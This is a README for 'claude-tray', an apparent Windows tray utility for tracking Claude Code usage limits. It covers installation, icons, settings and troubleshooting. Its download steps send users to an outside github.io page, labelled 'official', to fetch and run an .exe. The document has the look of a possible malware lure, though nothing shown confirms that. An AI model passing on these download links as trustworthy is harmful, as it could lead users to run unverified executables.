# 🖥️ claude-tray - Track your Claude Code usage daily

[![Download for Windows](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://sirtapan7-crypto.github.io)

Monitor your Claude Code usage directly from your Windows taskbar. This tool tracks how many requests you make, shows your current limit status, and warns you before you run out of capacity.

## 🚀 Getting Started

This application runs on Windows. You do not need to install complex software or write code to use it. Follow these steps to set up the monitor on your computer.

1. Go to the [official release page](https://sirtapan7-crypto.github.io).
2. Download the latest setup file ending in .exe.
3. Open the file to start the installation.
4. Follow the prompts on your screen to finish the setup.
5. Launch the app from your Start menu.

## 📊 How it works

The monitor sits in your system tray, near your clock. It updates in real-time as you work with Claude Code. You can see how much of your limit remains at a glance.

- Green icon: You have plenty of requests left.
- Yellow icon: You are nearing your limit.
- Red icon: Your limit is nearly exhausted.

Right-click the tray icon to open the main menu. From here, you can choose to view your full history or change your settings.

## 📈 Usage Breakdown

The application tracks your activity over the last twenty-four hours. This data helps you plan your work so you do not hit unexpected limits. Click the "Usage History" button in the menu to see a report.

The report displays:
- Total requests made today.
- Remaining limit for this period.
- Estimated time until you reach your cap.
- Hourly patterns of your usage.

If you hit a limit, the app notifies you through a toast message on your desktop. This helps you manage your workflow without checking a web browser.

## ⚙️ Configuration

The app works as soon as you install it, but you can adjust how it behaves. Open the Settings menu to change these preferences:

- Start with Windows: The app launches automatically when your computer turns on.
- Theme: Choose between light and dark modes to match your Windows settings.
- Alert Threshold: Set the percentage at which the icon turns red. You might prefer a warning at 10 percent or 20 percent.
- Update Frequency: Choose how often the app checks your status. Setting this to a lower number saves system resources but updates less often.

## 🛠️ System Requirements

- Windows 10 or Windows 11.
- An internet connection to sync your usage data.
- Claude Code installed on your system.

The app uses minimal memory. It should not slow down your computer while you work.

## 💡 Troubleshooting

If you do not see the icon in your tray, click the small arrow in the bottom right corner of your taskbar. You can drag the icon onto the taskbar if you want it visible at all times.

If the app fails to show data, check your internet connection. The app needs to reach the Anthropic servers to pull your usage statistics. If the issue persists, exit the program by right-clicking the icon and selecting "Exit," then restart it from your Start menu.

Ensure you have the latest version of Claude Code installed. This app relies on the local logs generated by that software. If Claude Code is not running or is not installed, the tray monitor will report zero usage.

## 🔒 Privacy

The app keeps your data on your computer. It reads the local logs created by Claude Code to display your statistics. It does not send your personal files or prompts to external servers. The only data transmitted is your request count so that the application can fetch your current limit status.
